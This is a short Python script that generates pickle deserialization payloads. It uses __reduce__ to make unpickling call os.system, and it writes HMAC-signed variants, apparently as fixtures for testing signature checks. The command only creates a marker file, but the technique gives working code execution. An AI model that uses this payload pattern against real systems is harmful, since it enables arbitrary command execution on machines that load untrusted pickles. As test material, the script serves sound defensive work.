import pickle
import os
import hmac
import hashlib


class MaliciousPayload:
    def __reduce__(self):
        # This method is called during unpickling.
        # We return os.system as the callable and a command as its argument.
        return os.system, ("touch ./you_have_been_hacked.txt",)


def generate_malicious_pickle():
    print("Generating malicious pickle payload...")
    malicious_object = MaliciousPayload()
    pickled_data = pickle.dumps(malicious_object)

    with open("malicious.pickle", "wb") as f:
        f.write(pickled_data)
    print("Malicious payload saved to malicious.pickle")

    with open("malicious_hmac_valid.pickle", "wb") as f:
        # Create a HMAC signature for the malicious data
        signature = hmac.new(b"secret_key", pickled_data, hashlib.sha256).digest()
        f.write(signature + b"\n" + pickled_data)
    print("Malicious payload saved to malicious_hmac_valid.pickle with valid signature")

    with open("malicious_hmac_invalid.pickle", "wb") as f:
        # Create a HMAC signature for the malicious data
        signature = hmac.new(b"attacker_key", pickled_data, hashlib.sha256).digest()
        f.write(signature + b"\n" + pickled_data)
    print(
        "Malicious payload saved to malicious_hmac_invalid.pickle with invalid signature"
    )


if __name__ == "__main__":
    generate_malicious_pickle()
